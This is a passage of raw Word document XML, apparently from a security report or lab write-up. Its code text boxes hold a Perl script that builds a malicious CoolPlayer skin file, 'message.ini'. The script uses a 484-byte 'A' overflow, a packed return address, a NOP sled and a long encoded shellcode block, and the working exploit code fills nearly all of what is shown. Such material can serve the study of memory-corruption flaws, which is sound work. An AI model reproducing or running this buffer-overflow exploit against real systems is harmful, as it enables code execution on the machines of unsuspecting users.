                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>"\x35\x43\x43\x43\x55\x43\x42\x4c\x48\x51\x4c\x56\x44\x54" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="4E5942B0" w14:textId="77777777" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>"\x4a\x4c\x49\x4d\x36\x51\x46\x4b\x4f\x56\x35\x43\x34\x4b" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="51603F17" w14:textId="77777777" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>"\x39\x49\x52\x56\x30\x4f\x4b\x49\x38\x4e\x42\x50\x4d\x4f" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="7461376F" w14:textId="77777777" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>"\x4c\x4c\x47\x45\x4c\x56\x44\x50\x52\x5a\x48\x45\x31\x4b" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="5098949C" w14:textId="77777777" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>"\x4f\x4b\x4f\x4b\x4f\x52\x48\x52\x4f\x54\x38\x51\x48\x47" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="088A051C" w14:textId="77777777" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>"\x50\x43\x58\x43\x51\x52\x47\x52\x45\x50\x42\x43\x58\x50" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="31F2ADE2" w14:textId="77777777" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>"\x4d\x45\x35\x54\x33\x54\x33\x56\x51\x49\x4b\x4d\x58\x51" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="46057F1C" w14:textId="77777777" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>"\x4c\x51\x34\x54\x4a\x4c\x49\x4d\x33\x52\x48\x56\x4e\x50" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="5BEA1E00" w14:textId="77777777" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>"\x58\x51\x30\x51\x30\x45\x38\x52\x4c\x52\x4f\x43\x51\x52" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="3F8DD51E" w14:textId="77777777" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>"\x44\x52\x48\x47\x50\x52\x50\x45\x31\x52\x59\x43\x58\x45" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="3F35C80D" w14:textId="77777777" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>"\x35\x43\x52\x52\x4f\x43\x48\x45\x38\x43\x43\x52\x53\x43" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="0D4860A2" w14:textId="77777777" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>"\x51\x45\x37\x43\x58\x43\x51\x47\x50\x52\x4d\x43\x55\x43" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="2CAFEC63" w14:textId="77777777" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>"\x58\x51\x30\x52\x49\x54\x33\x51\x30\x45\x38\x51\x44\x52" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="740C5B04" w14:textId="77777777" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>"\x48\x43\x59\x43\x43\x50\x31\x49\x59\x4b\x38\x50\x4c\x47" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="190CAC7B" w14:textId="77777777" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>"\x54\x45\x4d\x4d\x59\x4d\x31\x50\x31\x4e\x32\x51\x42\x50" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="1641A043" w14:textId="77777777" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>"\x53\x56\x31\x51\x42\x4b\x4f\x4e\x30\x56\x51\x49\x50\x50" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="1E689502" w14:textId="648203DD" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>"\x50\x4b\x4f\x51\x45\x54\x48\x41\x41";</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="2D292028" w14:textId="77777777" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>open($FILE,"&gt;$file1");</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="1DC35B60" w14:textId="77777777" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>print $FILE $buffer;</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="4D1AF44A" w14:textId="6A95383B" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>close($FILE);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AD80C" id="Text Box 39" o:spid="_x0000_s1044" type="#_x0000_t202" style="position:absolute;margin-left:-46.9pt;margin-top:16.75pt;width:253.65pt;height:548.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" fillcolor="white [3201]" strokeweight=".5pt">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="4CF172B3" w14:textId="283378F2" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>$file1 = "</w:t>
                      </w:r>
                      <w:r w:rsidR="004D7F6C">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>message</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t xml:space="preserve">.ini"; </w:t>
                      </w:r>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="65CA1657" w14:textId="77777777" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>$buffer = "[CoolPlayer Skin]\</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>nPlaylistSkin</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t xml:space="preserve">="; </w:t>
                      </w:r>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="14C7F53B" w14:textId="77777777" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>$buffer .= "A" x 484;</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="561781F1" w14:textId="77777777" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:bookmarkStart w:id="65" w:name="_Hlk103244583"/>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t xml:space="preserve">$buffer .= pack('V',0x7C86467B); </w:t>
                      </w:r>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="5EE0EC84" w14:textId="2796B2B3" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>$buffer .= "\x90" x 15;</w:t>
                      </w:r>
                      <w:r w:rsidR="00F51BD8">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                      <w:r w:rsidR="00F51BD8">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                        <w:t xml:space="preserve"> </w:t>
                      </w:r>
                      <w:r w:rsidR="00F51BD8" w:rsidRPr="00F51BD8">
                        <w:rPr>
                          <w:color w:val="8DC182" w:themeColor="accent4" w:themeTint="99"/>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>#NOP SLED</w:t>
                      </w:r>
                    </w:p>
                    <w:bookmarkEnd w:id="65"/>
                    <w:p w14:paraId="75DE685B" w14:textId="77777777" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>$buffer .= "\x89\xe7\</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>xdb</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>\xd0\xd9\x77\xf4\x5d\x55\x59\x49\x49\x49\x49" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="7056542E" w14:textId="6D8805F8" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>\x43\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33\x30\x56" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="3AE862EB" w14:textId="77777777" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>"\x58\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="0027B51B" w14:textId="77777777" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>"\x42\x41\x41\x42\x54\x41\x41\x51\x32\x41\x42\x32\x42\x42" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="0E5B7739" w14:textId="77777777" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>"\x30\x42\x42\x58\x50\x38\x41\x43\x4a\x4a\x49\x49\x49\x5a" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="65F971D7" w14:textId="77777777" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>"\x4b\x4d\x4b\x49\x49\x52\x54\x56\x44\x5a\x54\x56\x51\x4e" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="2D912CCA" w14:textId="77777777" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>"\x32\x4f\x42\x52\x57\x56\x51\x49\x59\x45\x34\x4c\x4b\x54" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="35700BB6" w14:textId="77777777" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>"\x31\x56\x50\x4c\x4b\x52\x56\x54\x4c\x4c\x4b\x43\x46\x45" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="267E2627" w14:textId="77777777" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>"\x4c\x4c\x4b\x47\x36\x54\x48\x4c\x4b\x43\x4e\x47\x50\x4c" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="508A6243" w14:textId="77777777" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>"\x4b\x47\x46\x56\x58\x50\x4f\x45\x48\x43\x45\x4c\x33\x56" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="67E871BD" w14:textId="77777777" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>"\x39\x45\x51\x58\x51\x4b\x4f\x4b\x51\x43\x50\x4c\x4b\x52" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="5B6051D9" w14:textId="77777777" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>"\x4c\x51\x34\x51\x34\x4c\x4b\x51\x55\x47\x4c\x4c\x4b\x56" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="1930EB25" w14:textId="77777777" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>"\x34\x56\x48\x52\x58\x45\x51\x5a\x4a\x4c\x4b\x50\x4a\x54" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="04B9A0D8" w14:textId="77777777" w:rsidR="00B05CEB" w:rsidRPr="00941EC1" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
